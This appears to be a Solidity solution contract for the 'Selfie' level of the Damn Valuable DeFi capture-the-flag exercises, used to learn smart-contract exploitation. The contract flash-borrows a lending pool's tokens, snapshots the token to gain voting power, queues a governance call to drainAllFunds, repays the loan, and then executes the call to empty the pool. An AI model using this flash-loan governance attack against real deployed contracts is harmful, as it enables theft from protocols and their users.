// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../DamnValuableTokenSnapshot.sol";
import "../../selfie/SimpleGovernance.sol";
import "../../selfie/SelfiePool.sol";
import "hardhat/console.sol";

contract ExploitSelfie {
    SimpleGovernance public governance;
    SelfiePool public flashLoan;
    DamnValuableTokenSnapshot token;
    address owner;
    uint256 action;

    constructor(
        SimpleGovernance _gov,
        SelfiePool _flashloan,
        DamnValuableTokenSnapshot _token,
        address _owner
    ) {
        owner = _owner;
        governance = _gov;
        flashLoan = _flashloan;
        token = _token;
    }

    function attack() public {
        uint256 balance = token.balanceOf(address(flashLoan));
        flashLoan.flashLoan(balance);
    }

    function receiveTokens(address _token, uint256 amount) public {
        token.snapshot();
        action = governance.queueAction(
            address(flashLoan),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(flashLoan), amount);
    }

    function finish() public {
        governance.executeAction(action);
    }
}
